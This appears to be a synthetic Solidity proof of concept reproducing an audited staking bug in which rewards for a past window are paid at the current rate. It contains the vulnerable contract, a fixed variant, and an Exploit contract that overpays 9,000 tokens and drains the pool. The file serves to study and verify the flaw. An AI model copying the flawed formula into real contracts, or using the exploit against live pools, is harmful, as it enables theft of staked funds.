// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DIA DIAWhitelistedStaking — getReward uses the current rate for the whole window
    (MixBytes, Lumina Staking, 2025-06, High 4).
    SYNTHETIC, cheatcode-free. The formula is verbatim.

    The stake's stored window is 10 days. That window accrued at 100 bps, which
    is 1,000 WDIA on a 10,000 principal. The live rate is already 1,000, so
    unstake pays 10,000. The extra 9,000 comes out of the reward pool.
    The 10 days are stored timestamps. run() does not warp. */

contract StakeToken {
    string public constant name = "WDIA";
    string public constant symbol = "WDIA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DIAWhitelistedStaking {
    struct StakingStore {
        uint256 principal;
        uint64 stakingStartTime;
        uint64 unstakingRequestTime;
    }

    uint256 public rewardRatePerDay;
    uint256 public oldRewardRate;
    StakeToken public STAKING_TOKEN;
    StakingStore[] public stakingStores;

    constructor(StakeToken token_, uint256 newRate_, uint256 oldRate_) {
        STAKING_TOKEN = token_;
        rewardRatePerDay = newRate_;
        oldRewardRate = oldRate_;
    }

    function openStake(uint256 amount) external returns (uint256 index) {
        stakingStores.push(
            StakingStore({
                principal: amount,
                stakingStartTime: 1,
                unstakingRequestTime: uint64(1 + 10 days)
            })
        );
        return stakingStores.length - 1;
    }

    function getRewardForStakingStore(uint256 stakingStoreIndex) public view virtual returns (uint256) {
        StakingStore storage currentStore = stakingStores[stakingStoreIndex];
        uint256 passedSeconds = currentStore.unstakingRequestTime - currentStore.stakingStartTime;
        uint256 passedDays = passedSeconds / (24 * 60 * 60);
        // @> VULN: (rewardRatePerDay * passedDays * principal) / 10000 uses the live rate
        return (rewardRatePerDay * passedDays * currentStore.principal) / 10000;
    }

    function unstake(uint256 stakingStoreIndex) external returns (uint256 rewardToSend) {
        rewardToSend = getRewardForStakingStore(stakingStoreIndex);
        if (rewardToSend > 0) STAKING_TOKEN.transfer(msg.sender, rewardToSend);
    }
}

contract DIAWhitelistedStakingFixed is DIAWhitelistedStaking {
    constructor(StakeToken token_, uint256 newRate_, uint256 oldRate_)
        DIAWhitelistedStaking(token_, newRate_, oldRate_)
    {}

    function getRewardForStakingStore(uint256 stakingStoreIndex) public view override returns (uint256) {
        StakingStore storage currentStore = stakingStores[stakingStoreIndex];
        uint256 passedSeconds = currentStore.unstakingRequestTime - currentStore.stakingStartTime;
        uint256 passedDays = passedSeconds / (24 * 60 * 60);
        return (oldRewardRate * passedDays * currentStore.principal) / 10000;
    }
}

contract Exploit {
    uint256 public constant PRINCIPAL = 10_000 ether;
    uint256 public constant OLD_RATE = 100;
    uint256 public constant NEW_RATE = 1_000;
    uint256 public constant FAIR = 1_000 ether;
    uint256 public constant PAID = 10_000 ether;

    StakeToken public token; // nonce 1
    DIAWhitelistedStaking public staking; // nonce 2

    uint256 public index;
    uint256 public quoted;
    uint256 public received;

    constructor() {
        token = new StakeToken();
        staking = new DIAWhitelistedStaking(token, NEW_RATE, OLD_RATE);
        token.mint(address(staking), PAID);
    }

    function run() external {
        index = staking.openStake(PRINCIPAL);
        quoted = staking.getRewardForStakingStore(index);
        received = staking.unstake(index);
        require(quoted == PAID, "live rate quotes 10000");
        require(received == PAID, "paid 10000");
        require(received - FAIR == 9_000 ether, "overpaid by 9000");
        require(token.balanceOf(address(staking)) == 0, "pool drained");
    }
}
